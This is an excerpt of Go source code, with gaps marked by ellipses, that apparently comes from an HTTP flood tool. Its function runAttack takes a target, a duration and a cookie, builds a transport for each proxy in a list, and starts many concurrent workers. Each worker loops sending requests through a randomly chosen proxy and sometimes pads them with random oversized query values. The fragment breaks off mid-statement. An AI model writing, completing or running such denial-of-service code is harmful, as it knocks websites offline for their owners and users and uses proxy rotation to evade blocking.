...
func createTransport(host string, useCustomResolver bool, proxyURL *url.URL) *http.Transport {
...
func runAttack(tgt string, dur int, cookie string) {
	...
	probeTransport := createTransport(host, useCustom, nil)
	...
	transports := make([]*http.Transport, len(PRX))
	for i, p := range PRX {
		tr := createTransport(host, useCustom, p)
		transports[i] = tr
	}
	...
	for i := 0; i < Speed; i++ {
		...
		go func(workerID int) {
			...
			for ctx.Err() == nil {
				proxyIdx := rng.Intn(len(transports))
				tr := transports[proxyIdx]
				client := &http.Client{
					Transport: tr,
					Timeout:   to,
				}
				...
				if rng.Intn(100) < 40 {
					q.Set("big", RST(rng, 10+rng.Intn(21)))
				}
				if rng.Intn(10) == 0 {
